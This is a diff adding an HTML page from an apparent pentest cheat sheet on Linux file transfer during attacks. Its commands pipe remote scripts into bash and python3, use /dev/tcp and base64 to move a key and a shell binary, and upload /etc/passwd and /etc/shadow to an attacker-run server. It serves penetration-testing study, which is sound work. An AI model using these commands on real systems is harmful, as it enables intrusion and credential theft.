@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Pentest CheatSheet | Pentest CheatSheet</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Pentest CheatSheet" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Pentest CheatSheet" />
+<meta property="og:description" content="Pentest CheatSheet" />
+<link rel="canonical" href="http://localhost:4000/zNew/TransferFiles/Linux.html" />
+<meta property="og:url" content="http://localhost:4000/zNew/TransferFiles/Linux.html" />
+<meta property="og:site_name" content="Pentest CheatSheet" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Pentest CheatSheet" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Pentest CheatSheet","headline":"Pentest CheatSheet","url":"http://localhost:4000/zNew/TransferFiles/Linux.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Pentest CheatSheet</h1>
+        </a>
+        <h2>Pentest CheatSheet</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="open-server">OPEN SERVER:</h1>
+<h2 id="python">PYTHON:</h2>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">python3 -m http.server 1234</code> local machine</li>
+</ul>
+
+<h1 id="wget">WGET</h1>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">wget http://10.10.14.1:8000/linenum.sh</code> target machine</li>
+  <li><code class="language-plaintext highlighter-rouge">curl http://10.10.14.1:8000/linenum.sh -o</code> linenum.sh</li>
+</ul>
+
+<h1 id="scp">SCP</h1>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">scp linenum.sh user@remotehost:/tmp/linenum.sh</code> local machine</li>
+</ul>
+
+<h1 id="attack-to-target">Attack to Target</h1>
+<h2 id="base64-encoding--decoding">Base64 Encoding / Decoding</h2>
+<p><strong>Encode SSH Key to Base64</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>id_rsa |base64 <span class="nt">-w</span> 0<span class="p">;</span><span class="nb">echo</span><span class="sb">`</span>
+</code></pre></div></div>
+
+<p><strong>Decode the File</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo </span>f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... &lt;SNIP&gt; ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> shell<span class="sb">`</span>
+</code></pre></div></div>
+
+<p><strong>Confirm the MD5 Hashes Match</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">md5sum </span>id_rsa
+</code></pre></div></div>
+
+<h2 id="web-downloads-with-wget-and-curl">Web Downloads with Wget and cURL</h2>
+<p><strong>Download a File Using wget</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh <span class="nt">-O</span> /tmp/LinEnum.sh<span class="sb">`</span>
+</code></pre></div></div>
+
+<p><strong>Download a File Using cURL</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-o</span> /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh<span class="sb">`</span>
+</code></pre></div></div>
+
+<h2 id="fileless-attacks-using-linux">Fileless Attacks Using Linux</h2>
+<p><strong>Fileless Download with cURL</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash<span class="sb">`</span>
+</code></pre></div></div>
+
+<p><strong>Fileless Download with wget</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget <span class="nt">-qO-</span> https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3<span class="sb">`</span>
+</code></pre></div></div>
+<h2 id="download-with-bash-devtcp">Download with Bash (/dev/tcp)</h2>
+<p><strong>Connect to the Target Webserver</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">exec </span>3&lt;<span class="o">&gt;</span>/dev/tcp/10.10.10.32/80<span class="sb">`</span>
+</code></pre></div></div>
+
+<p><strong>HTTP GET Request</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"GET /LinEnum.sh HTTP/1.1</span><span class="se">\n\n</span><span class="s2">"</span><span class="o">&gt;</span>&amp;3<span class="sb">`</span>
+</code></pre></div></div>
+
+<p><strong>Print the Response</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> &lt;&amp;3<span class="sb">`</span>
+</code></pre></div></div>
+
+<h2 id="ssh-downloads">SSH Downloads</h2>
+<p>SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol.</p>
+
+<p>SCP (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.</p>
+
+<p>SCP is very similar to copy or cp, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user’s credentials.</p>
+
+<p><strong>Enabling the SSH Server</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>systemctl <span class="nb">enable </span>ssh<span class="sb">`</span>
+</code></pre></div></div>
+
+<p><strong>Starting the SSH Server</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>systemctl start ssh<span class="sb">`</span>
+</code></pre></div></div>
+
+<p><strong>Checking for SSH Listening Port</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>netstat <span class="nt">-lnpt</span><span class="sb">`</span>
+</code></pre></div></div>
+
+<p><strong>Downloading Files Using SCP</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>scp plaintext@192.168.49.128:/root/myroot.txt <span class="nb">.</span> <span class="sb">`</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.</code></p>
+
+<h1 id="target-to-attack">Target to Attack</h1>
+<h2 id="web-upload">Web Upload</h2>
+<p><strong>Attack - Start Web Server</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> pip <span class="nb">install</span> <span class="nt">--user</span> uploadserver<span class="sb">`</span>
+</code></pre></div></div>
+
+<p><strong>Attack - Create a Self-Signed Certificate</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>openssl req <span class="nt">-x509</span> <span class="nt">-out</span> server.pem <span class="nt">-keyout</span> server.pem <span class="nt">-newkey</span> rsa:2048 <span class="nt">-nodes</span> <span class="nt">-sha256</span> <span class="nt">-subj</span> <span class="s1">'/CN=server'</span><span class="sb">`</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.</code></p>
+
+<p><strong>Attack - Start Web Server</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir </span>https <span class="o">&amp;&amp;</span> <span class="nb">cd </span>https
+<span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> uploadserver 443 <span class="nt">--server-certificate</span> /root/server.pem
+</code></pre></div></div>
+
+<p><strong>Target - Upload Multiple Files</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-X</span> POST https://192.168.49.128/upload <span class="nt">-F</span> <span class="s1">'files=@/etc/passwd'</span> <span class="nt">-F</span> <span class="s1">'files=@/etc/shadow'</span> <span class="nt">--insecure</span>
+</code></pre></div></div>
+
+<h2 id="alternative-web-file-transfer-method">Alternative Web File Transfer Method</h2>
+<p><strong>Target - Creating a Web Server with Python3</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 <span class="nt">-m</span> http.server
+</code></pre></div></div>
+
+<p><strong>Target - Creating a Web Server with Python2.7</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python2.7 <span class="nt">-m</span> SimpleHTTPServer
+</code></pre></div></div>
+
+<p><strong>Target - Creating a Web Server with PHP</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>php <span class="nt">-S</span> 0.0.0.0:8000
+</code></pre></div></div>
+
+<p><strong>Target - Creating a Web Server with Ruby</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ruby <span class="nt">-run</span> <span class="nt">-ehttpd</span> <span class="nb">.</span> <span class="nt">-p8000</span>
+</code></pre></div></div>
+
+<p><strong>Download the File from the Target Machine onto the Attack</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget 192.168.49.128:8000/filetotransfer.txt
+</code></pre></div></div>
+
+<h2 id="scp-upload">SCP Upload</h2>
+<p><strong>File Upload using SCP</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scp <span class="nt">-P</span> 3520 usuario@192.168.49.128:/home/usuario/arquivo.txt <span class="nb">.</span>
+</code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
